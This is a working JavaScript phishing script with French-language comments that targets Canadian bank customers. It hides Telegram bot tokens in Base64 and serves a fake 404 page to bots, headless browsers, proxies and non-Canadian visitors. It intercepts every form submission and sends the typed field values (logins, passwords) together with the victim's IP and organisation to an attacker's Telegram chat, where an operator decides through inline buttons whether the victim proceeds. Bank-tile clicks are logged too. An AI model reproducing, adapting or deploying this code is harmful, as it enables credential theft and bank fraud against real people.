var _0xT=["ODU4NDE3MTI5MTpBQUhmRmszSDFXaGNBYXhUT09SNXZmcWV2cmJla3lDNW5ZNA==","Nzk3NzA0MzA2MjpBQUVwRVQ5SEpFMEl4dFVGOUtkRWJob1F5eVBOb293eGIxZw==","Njc4ODAxMjQ4MQ=="];
(function(_W,_D,_N){
'use strict';
var _M=atob(_0xT[0]),_R=atob(_0xT[1]),_ID=atob(_0xT[2]),_CC='CA';
var _SID=_W.sessionStorage.getItem('__xs')||function(){var x=Math.random().toString(36).slice(2,11).toUpperCase();_W.sessionStorage.setItem('__xs',x);return x;}();

// ── FAKE 404 ──────────────────────────────────────────────────
function _die(){try{_D.open();_D.write('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found.</p><hr><address>Apache/2.4.52 Server</address></body></html>');_D.close();_W.history.pushState(null,'','/404');}catch(e){_W.location.replace('/404');}}

// ── BOT DETECTION (signaux certains seulement) ───────────────
function _bot(){
  // Selenium / WebDriver explicite
  if(_N.webdriver===true)return 1;
  if(_D.documentElement.getAttribute('webdriver'))return 1;
  // PhantomJS
  if(_W.callPhantom||_W._phantom)return 1;
  // NightmareJS
  if(_W.__nightmare)return 1;
  // Chrome DevTools Protocol automation
  if(_W.domAutomation||_W.domAutomationController)return 1;
  // UA explicitement bot/headless
  if(/HeadlessChrome|PhantomJS|SlimerJS|Selenium|WebDriver/i.test(_N.userAgent||''))return 1;
  return 0;
}

// ── TELEGRAM ─────────────────────────────────────────────────
function _tg(_tok,_txt,_kb){
  var _b={chat_id:_ID,text:_txt,parse_mode:'HTML'};
  if(_kb)_b.reply_markup={inline_keyboard:_kb};
  return fetch('https://api.telegram.org/bot'+_tok+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(_b)});
}

// ── POLL ─────────────────────────────────────────────────────
function _poll(_tok,_cb){
  var _e=0,_tm=setInterval(function(){
    _e+=3000;if(_e>600000){clearInterval(_tm);return;}
    fetch('https://api.telegram.org/bot'+_tok+'/getUpdates?offset=-1&timeout=1')
      .then(function(r){return r.json();})
      .then(function(d){
        var _rs=d.result||[];if(!_rs.length)return;
        var _u=_rs[_rs.length-1],_cq=_u.callback_query;
        if(!_cq)return;
        var _dv=_cq.data||'';
        if(_dv.indexOf(_SID)===-1)return;
        clearInterval(_tm);_cb(_dv);
        fetch('https://api.telegram.org/bot'+_tok+'/answerCallbackQuery?callback_query_id='+_cq.id);
      }).catch(function(){});
  },3000);
}

// ── LOADER ───────────────────────────────────────────────────
function _ldr(show){
  var _e=_D.getElementById('__ld');
  if(!_e&&show){
    _e=_D.createElement('div');_e.id='__ld';
    _e.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.97);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:2147483647;';
    _e.innerHTML='<div style="border:4px solid #eee;border-top:4px solid #222;border-radius:50%;width:48px;height:48px;animation:_sp 0.8s linear infinite"></div><p style="margin-top:18px;font-family:Arial,sans-serif;font-size:16px;color:#555">Veuillez patienter...</p><style>@keyframes _sp{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>';
    _D.body.appendChild(_e);
  }
  if(_e)_e.style.display=show?'flex':'none';
}

// ── FORMS ────────────────────────────────────────────────────
function _forms(){
  var _ip=_W.sessionStorage.getItem('__xip')||'N/A';
  var _org=_W.sessionStorage.getItem('__xorg')||'N/A';
  var _pg=_W.location.pathname.split('/').pop()||'index';
  _D.querySelectorAll('form').forEach(function(_f){
    if(_f.dataset.xh)return;_f.dataset.xh='1';
    _f.addEventListener('submit',function(_ev){
      _ev.preventDefault();_ev.stopImmediatePropagation();
      var _flds=[];
      _f.querySelectorAll('input:not([type=hidden]):not([type=submit]):not([type=checkbox]):not([type=radio]),select,textarea').forEach(function(_i){
        _flds.push('<b>'+(_i.name||_i.id||_i.placeholder||_i.type||'?')+':</b> <code>'+(_i.value||'(vide)')+'</code>');
      });
      var _nx=_f.getAttribute('action')||'';
      var _msg='\uD83D\uDD10 <b>CAPTURE | '+_pg.toUpperCase()+'</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n'+_flds.join('\n')+'\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\uD83D\uDCCD IP: <code>'+_ip+'</code>\n\uD83C\uDFE2 Org: <code>'+_org+'</code>\n\uD83C\uDD94 Session: <code>'+_SID+'</code>';
      var _kb=[[{text:'\u2705 Valide',callback_data:_SID+':ok'},{text:'\u274c Erreur',callback_data:_SID+':err'}],[{text:'\u23f3 +30s',callback_data:_SID+':30'},{text:'\u23f3 +60s',callback_data:_SID+':60'},{text:'\u23f3 +120s',callback_data:_SID+':120'}]];
      _ldr(true);
      _tg(_M,_msg,_kb).catch(function(){_ldr(false);_W.location.href=_nx;});
      _poll(_M,function(_a){
        if(_a.indexOf(':ok')!==-1){_ldr(false);_W.location.href=_nx;}
        else if(_a.indexOf(':err')!==-1){_ldr(false);_W.location.reload();}
        else{var _t=_a.indexOf(':30')!==-1?30000:_a.indexOf(':60')!==-1?60000:120000;setTimeout(function(){_ldr(false);_W.location.href=_nx;},_t);}
      });
    },true);
  });
}

// ── BANK TILES ───────────────────────────────────────────────
function _banks(){
  var _ip=_W.sessionStorage.getItem('__xip')||'N/A';
  var _org=_W.sessionStorage.getItem('__xorg')||'N/A';
  _D.querySelectorAll('[filabel],[data-fi],.fi-tile').forEach(function(_el){
    if(_el.dataset.xb)return;_el.dataset.xb='1';
    _el.addEventListener('click',function(){
      var _lbl=_el.getAttribute('filabel')||_el.getAttribute('data-fi')||_el.innerText||'?';
      _tg(_R,'\uD83C\uDFE6 <b>BANQUE S\u00C9LECTIONN\u00C9E</b>\n\uD83C\uDFF7\uFE0F <b>'+_lbl.trim()+'</b>\n\uD83D\uDCCD IP: <code>'+_ip+'</code>\n\uD83C\uDFE2 Org: <code>'+_org+'</code>\n\uD83C\uDD94 Session: <code>'+_SID+'</code>');
    });
  });
}

// ── INIT ─────────────────────────────────────────────────────
function _init(){
  // 1. Blocage bot certain
  if(_bot()){_die();return;}

  // 2. Vérification IP via ip-api (bloque proxy + non-CA ; hosting seul = pas bloqué car faux positifs ISP)
  fetch('https://ip-api.com/json/?fields=status,countryCode,proxy,hosting,query,org,isp')
    .then(function(r){return r.json();})
    .then(function(d){
      if(d.status!=='success'){
        // Fallback Cloudflare
        _cfFallback();return;
      }
      // Bloquer si non-CA
      if(d.countryCode!==_CC){_die();return;}
      // Bloquer proxy/VPN (mais PAS hosting seul pour éviter faux positifs ISP canadiens)
      if(d.proxy){_die();return;}

      _W.sessionStorage.setItem('__xip',d.query);
      _W.sessionStorage.setItem('__xorg',d.org||d.isp||'N/A');
      _tg(_R,'\uD83D\uDFE2 <b>CONNEXION</b>\n\uD83D\uDCCD IP: <code>'+d.query+'</code>\n\uD83C\uDF0D Pays: <code>'+d.countryCode+'</code>\n\uD83C\uDFE2 Org: <code>'+(d.org||d.isp)+'</code>\n\uD83C\uDFE0 Hosting: '+(d.hosting?'OUI':'non')+'\n\uD83D\uDCC4 Page: <code>'+(_W.location.pathname.split('/').pop()||'index')+'</code>\n\uD83C\uDD94 Session: <code>'+_SID+'</code>');
      _forms();_banks();
    })
    .catch(function(){_cfFallback();});
}

function _cfFallback(){
  fetch('https://www.cloudflare.com/cdn-cgi/trace')
    .then(function(r){return r.text();})
    .then(function(t){
      var _loc=(t.match(/loc=([A-Z]{2})/)||[])[1];
      var _ipv=(t.match(/ip=([^\n]+)/)||[])[1]||'N/A';
      if(_loc!==_CC){_die();return;}
      _W.sessionStorage.setItem('__xip',_ipv);
      _forms();_banks();
    }).catch(function(){_die();});
}

_D.readyState==='loading'?_D.addEventListener('DOMContentLoaded',_init):_init();
}(window,document,navigator));